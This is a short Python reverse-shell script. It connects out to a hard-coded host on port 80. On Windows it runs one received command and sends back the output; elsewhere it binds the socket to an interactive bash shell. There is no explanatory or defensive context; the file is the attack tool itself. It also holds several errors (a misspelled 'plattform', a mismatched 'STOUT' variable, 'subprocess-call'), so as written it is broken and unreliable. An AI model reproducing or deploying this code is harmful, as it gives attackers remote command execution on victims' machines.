#!/usr/bin/python3
import os, socket, subprocess, sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.81",80))

if sys.plattform == "win32" or sys.plattform == "cygwin":
    data = s.recv(8192)
    if data:
        cmd = data.decode("UTF-8", errors="replace").strip()
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STOUT, STDERR = proc.communicate()
        
        s.send(STDOUT)
        s.send(STDERR)
        
else:
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    proc = subprocess-call(['/bin/bash', '-i'])
    


